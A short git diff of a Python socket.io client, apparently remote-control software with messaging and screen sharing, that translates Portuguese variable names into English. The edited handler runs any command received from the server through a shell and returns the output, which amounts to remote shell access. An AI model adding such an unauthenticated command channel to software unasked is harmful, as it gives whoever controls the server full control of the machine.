@@ -123,24 +123,24 @@ def send_message(cliente):
         sio.emit('private_message', {'to': cliente, 'message': message})
         
 @sio.event
-def command_received(comando: str):
+def command_received(command: str):
     try:
-        resultado = subprocess.run(
-            comando,
+        result = subprocess.run(
+            command,
             shell=True,            
             capture_output=True,   
             text=True              
         )
         return {
-            "saida": resultado.stdout.strip(),
-            "erro": resultado.stderr.strip(),
-            "codigo_retorno": resultado.returncode
+            "out": result.stdout.strip(),
+            "error": result.stderr.strip(),
+            "return_code": result.returncode
         }
     except Exception as e:
         return {
-            "saida": "",
-            "erro": str(e),
-            "codigo_retorno": -1
+            "out": "",
+            "error": str(e),
+            "return_code": -1
         }
         
 def frame_share(cliente):
